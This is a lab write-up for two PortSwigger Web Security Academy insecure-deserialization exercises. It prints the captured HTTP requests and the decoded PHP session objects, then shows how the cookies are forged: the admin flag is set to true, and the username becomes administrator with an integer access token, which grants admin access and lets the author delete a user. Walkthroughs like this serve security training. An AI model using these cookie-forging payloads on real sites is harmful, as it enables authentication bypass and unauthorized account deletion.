### Modifying serialized objects

This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos's account.

You can log in to your own account using the following credentials: wiener:peter

Enter Credential in Login Form.

![Login Page](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Insecure-deserialization/ID-1.png)

Capture the Request Using Burp Suite.

```
POST /login HTTP/1.1
Host: acf61f251eecb4b2c0ee0f960029001f.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://acf61f251eecb4b2c0ee0f960029001f.web-security-academy.net
DNT: 1
Connection: close
Referer: https://acf61f251eecb4b2c0ee0f960029001f.web-security-academy.net/login
Cookie: session=
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1

username=wiener&password=peter

```

After Login we will be redirect to my-account and assign cookie base64 Serialized object.
Lets Decode it and modify it.

```
GET /my-account HTTP/1.1
Host: acf61f251eecb4b2c0ee0f960029001f.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acf61f251eecb4b2c0ee0f960029001f.web-security-academy.net/login
DNT: 1
Connection: close
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1

```

After modifying the session cookie
just change boolean value of admin to 1.

```
GET /my-account HTTP/1.1
Host: acf61f251eecb4b2c0ee0f960029001f.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acf61f251eecb4b2c0ee0f960029001f.web-security-academy.net/login
DNT: 1
Connection: close
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1

```

After modifying we will redirect to admin page.
Show in below
just Delete user carlos and lab will be solved.

![Admin Page](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Insecure-deserialization/ID-2.png)

---

### Modifying serialized data types

This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos.

You can log in to your own account using the following credentials: wiener:peter

![Website](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Insecure-deserialization/ID-3.png)

Login with Credential

![Login](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Insecure-deserialization/ID-4.png)

```
POST /login HTTP/1.1
Host: acb71f3d1e3d3f3ac0227a780061000b.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://acb71f3d1e3d3f3ac0227a780061000b.web-security-academy.net
DNT: 1
Connection: close
Referer: https://acb71f3d1e3d3f3ac0227a780061000b.web-security-academy.net/login
Cookie: session=
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1

username=wiener&password=peter

```

After Forwarding Request We get following response.

```
GET /my-account HTTP/1.1
Host: acb71f3d1e3d3f3ac0227a780061000b.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acb71f3d1e3d3f3ac0227a780061000b.web-security-academy.net/login
DNT: 1
Connection: close
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJxZTBsNXFucXFuZzA5aXJtNzhmdTM0dm1jbzRiMG1sMyI7fQ%3d%3d
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1

```

Lets Decode Session Cookie

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJxZTBsNXFucXFuZzA5aXJtNzhmdTM0dm1jbzRiMG1sMyI7fQ%3d%3d

After Decoding

O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"qe0l5qnqqng09irm78fu34vmco4b0ml3";}

Lets modify this object

O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}

Forward this Request.

```

GET /my-account HTTP/1.1
Host: acb71f3d1e3d3f3ac0227a780061000b.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acb71f3d1e3d3f3ac0227a780061000b.web-security-academy.net/login
DNT: 1
Connection: close
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9Cg==
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1

```

![Admin Panal](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Insecure-deserialization/ID-5.png)

Delete Carlos User

```
GET /admin/delete?username=carlos HTTP/1.1
Host: acb71f3d1e3d3f3ac0227a780061000b.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: https://acb71f3d1e3d3f3ac0227a780061000b.web-security-academy.net/admin
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9Cg==
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1
```

Lab Complete

![Success](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Insecure-deserialization/ID-6.png)

---
